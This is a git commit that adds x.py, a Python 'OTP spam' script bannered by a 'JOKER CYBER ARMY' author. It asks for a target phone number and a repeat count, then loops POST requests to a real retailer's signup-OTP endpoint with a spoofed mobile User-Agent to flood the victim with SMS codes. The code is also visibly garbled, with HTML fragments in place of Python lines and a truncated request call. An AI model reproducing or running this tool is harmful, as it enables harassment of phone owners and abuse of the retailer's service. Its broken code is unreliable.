a97ca0a89af688978805d01fe6740eef32ed0324
TnDelvac <87006188+TnDelvac@users.noreply.github.com>
2021-07-09 11:46:35 +0700

    Add files via upload

---
+++ x.py
@@ -0,0 +1,38 @@
+<input type="button" value="improt json>
+import requests
+import sys
+import os
+
+def main():
+        os.system('clear')
+        os. system('figlet Tn.Delvac 17 ')
+        banner= '''
+
+        [+]AUTHOR :Tn.Delvac 17
+        [+]Instagram :delvac17
+        [+]Team : JOKER CYBER ARMY
+        '''
+
+        print(banner)
+        no = input('target : ')
+        jum = input('Jumlah Spam : ')
+
+        <head></head> = {
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+                "Referer": "https://www.mapclub.com/en/user/signup",
+                Host": "cmsapi.mapclub.com",
+                }
+
+        dat  = {
+        'phone' : no
+        }
+
+        for x in range(int(jum)):
+        leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp",header
+        if 'eror' in leosureo:
+                print('gagal mengirim ' + no)
+        else:
+                print('succes mengirim ' + no)
+
+
+main()
